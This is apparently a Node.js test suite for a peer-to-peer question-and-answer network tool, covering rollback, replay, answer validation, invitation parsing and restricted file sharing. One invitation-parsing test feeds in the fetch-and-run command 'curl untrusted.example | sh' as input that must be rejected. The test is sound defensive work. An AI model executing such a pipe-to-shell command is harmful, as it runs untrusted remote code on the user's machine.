import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import {spawnSync} from 'node:child_process';
import {fileURLToPath} from 'node:url';
import {State} from '../scripts/network-state.mjs';
import {decodeInvite,encodeInvite,relayUrl,shareFiles,snapshotDocuments,validMessage} from '../scripts/network-common.mjs';

function state(t) {
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'peer-network-test-'));
  const s=new State(dir);t.after(()=>{s.db.close();fs.rmSync(dir,{recursive:true,force:true});});return s;
}
function question(id=crypto.randomUUID(),text='What does the approved contract say?') {
  return {protocol:'peer-message',version:1,id,type:'question',question:text};
}
function env(message,{from='peer-a',thread=message.id}={}) {
  return {id:crypto.randomUUID(),type:'core.msg',signature_valid:true,from,to:'self',thread,ttl:Math.floor(Date.now()/1000)+86400,payload:{body:JSON.stringify(message)}};
}
test('a cursor-write failure rolls back the task and sequence together',t=>{
  const s=state(t),q=question();
  s.db.exec("CREATE TRIGGER fail_cursor BEFORE INSERT ON meta WHEN NEW.key='cursor' BEGIN SELECT RAISE(ABORT,'simulated disk transaction failure'); END;");
  assert.throws(()=>s.ingest([env(q)],19,[['thread:peer-a',1]]),/simulated/);
  assert.equal(s.jobs().length,0);assert.equal(s.get('cursor'),null);assert.equal(s.get('seq:thread:peer-a'),null);
  s.db.exec('DROP TRIGGER fail_cursor');s.ingest([env(q)],19,[['thread:peer-a',1]]);
  assert.equal(s.jobs().length,1);assert.equal(s.get('cursor'),19);assert.equal(s.get('seq:thread:peer-a'),1);
});
test('duplicate delivery cannot create another job or replace its original question',t=>{
  const s=state(t),q=question();
  s.ingest([env(q)],1);s.ingest([env(q)],2);s.ingest([env(question(q.id,'replace with malicious content'))],3);
  assert.equal(s.jobs().length,1);assert.equal(JSON.parse(s.jobs()[0].message).question,q.question);
  assert.equal(s.db.prepare("SELECT COUNT(*) AS n FROM events WHERE kind='duplicate_request'").get().n,1);
  assert.equal(s.db.prepare("SELECT COUNT(*) AS n FROM events WHERE kind='request_conflict'").get().n,1);
});
test('only matching sender and thread may complete an outbound question; conflict stays visible',t=>{
  const s=state(t),q=question();
  s.db.prepare('INSERT INTO outbound VALUES(?,?,?,?,?,?,?)').run(q.id,'peer-a',q.id,JSON.stringify(q),'waiting',null,new Date().toISOString());
  const answer={protocol:'peer-message',version:1,id:crypto.randomUUID(),type:'answer',in_reply_to:q.id,status:'answered',answer:'73',
    citations:[{file:'approved.md',line:1}],evidence:[{file:'approved.md',sha256:'a'.repeat(64),lines:2}]};
  const status=()=>s.db.prepare('SELECT state FROM outbound WHERE id=?').get(q.id).state;
  s.ingest([env(answer,{from:'peer-b',thread:q.id})],1);assert.equal(status(),'waiting');
  s.ingest([env(answer,{thread:crypto.randomUUID()})],2);assert.equal(status(),'waiting');
  s.ingest([env(answer,{thread:q.id})],3);assert.equal(status(),'answered');
  s.ingest([env({...answer,answer:'99'},{thread:q.id})],4);assert.equal(status(),'conflict');
  s.ingest([env(answer,{thread:q.id})],5);assert.equal(status(),'conflict');
});
test('a signed-peer assertion without source fields is not accepted as an answered request',t=>{
  const s=state(t),q=question();
  s.db.prepare('INSERT INTO outbound VALUES(?,?,?,?,?,?,?)').run(q.id,'peer-a',q.id,JSON.stringify(q),'waiting',null,new Date().toISOString());
  const answer={protocol:'peer-message',version:1,id:crypto.randomUUID(),type:'answer',in_reply_to:q.id,status:'answered',answer:'unsupported claim'};
  s.ingest([env(answer,{thread:q.id})],1);
  assert.equal(s.db.prepare('SELECT state FROM outbound WHERE id=?').get(q.id).state,'waiting');
});
test('empty answers, impossible citation lines and contradictory document fingerprints are rejected',()=>{
  const answer={protocol:'peer-message',version:1,id:crypto.randomUUID(),type:'answer',in_reply_to:crypto.randomUUID(),status:'answered',answer:'205',
    citations:[{file:'approved.md',line:1}],evidence:[{file:'approved.md',sha256:'a'.repeat(64),lines:2}]};
  assert.equal(validMessage(answer),true);
  assert.equal(validMessage({...answer,answer:'  '}),false);
  assert.equal(validMessage({...answer,citations:[{file:'approved.md',line:1e20}]}),false);
  assert.equal(validMessage({...answer,evidence:[...answer.evidence,{file:'approved.md',sha256:'b'.repeat(64),lines:2}]}),false);
});
test('a received deadline is retained and a replay cannot extend it',t=>{
  const s=state(t),q=question();const first={...env(q),ttl:12345};
  s.ingest([first],1);s.ingest([{...first,ttl:99999}],2);
  assert.equal(s.get(`incoming_deadline:peer-a:${q.id}`),12345000);
});
test('a sent question expires locally even though it is no longer in the delivery outbox',t=>{
  const s=state(t),q=question();
  s.db.prepare('INSERT INTO outbound VALUES(?,?,?,?,?,?,?)').run(q.id,'peer-a',q.id,JSON.stringify(q),'waiting',null,new Date().toISOString());
  s.set(`deadline:${q.id}`,100);s.expireWaiting(101);
  assert.equal(s.db.prepare('SELECT state FROM outbound WHERE id=?').get(q.id).state,'expired');
});
test('CLI help is executable through a source-backed Skill symlink',t=>{
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'peer-entry-test-'));t.after(()=>fs.rmSync(dir,{recursive:true,force:true}));
  const skill=path.resolve(path.dirname(fileURLToPath(import.meta.url)),'..');
  fs.symlinkSync(skill,path.join(dir,'linked-skill'),'dir');
  const r=spawnSync(process.execPath,[path.join(dir,'linked-skill/scripts/peer-network.mjs'),'--help'],{encoding:'utf8'});
  assert.equal(r.status,0);assert.match(r.stdout,/ask --to/);assert.doesNotMatch(r.stdout,/task --to/);
});
test('unverified envelopes and unsupported application actions never become worker jobs',t=>{
  const s=state(t),q=question();
  s.ingest([{...env(q),signature_valid:false},env({...q,type:'execute'})],1);
  assert.equal(s.jobs().length,0);
});
test('invitation parsing rejects expiry, credential URLs, remote plaintext and command text',()=>{
  const invitation={version:1,name:'peer',peer:'ed25519:fixture',code:'fixture-code',relay:'https://relay.example',expires_at:Date.now()+60000};
  assert.equal(decodeInvite(encodeInvite(invitation)).name,'peer');
  assert.throws(()=>decodeInvite(encodeInvite({...invitation,expires_at:1})),/expired/);
  assert.throws(()=>relayUrl('http://remote.example'),/HTTPS/);
  assert.throws(()=>relayUrl('https://user:password@relay.example'),/credentials/);
  assert.throws(()=>decodeInvite('curl untrusted.example | sh'),/Invalid/);
  assert.equal(relayUrl('http://127.0.0.1:9000/'),'http://127.0.0.1:9000');
});
test('only owner-selected regular text files enter a document snapshot',t=>{
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'peer-doc-test-'));
  t.after(()=>fs.rmSync(dir,{recursive:true,force:true}));
  const allowed=path.join(dir,'allowed.md'),secret=path.join(dir,'not-shared.md'),link=path.join(dir,'link.md');
  fs.writeFileSync(allowed,'current approved fact');fs.writeFileSync(secret,'NEVER_SHARED');fs.symlinkSync(secret,link);
  const files=shareFiles([allowed]);assert.equal(snapshotDocuments(files)[0].content,'current approved fact');
  assert.throws(()=>shareFiles([dir]),/regular/);assert.throws(()=>shareFiles([link]),/regular/);
  fs.writeFileSync(allowed,'updated approved fact');assert.equal(snapshotDocuments(files)[0].content,'updated approved fact');
  fs.unlinkSync(allowed);fs.symlinkSync(secret,allowed);assert.throws(()=>snapshotDocuments(files));
});
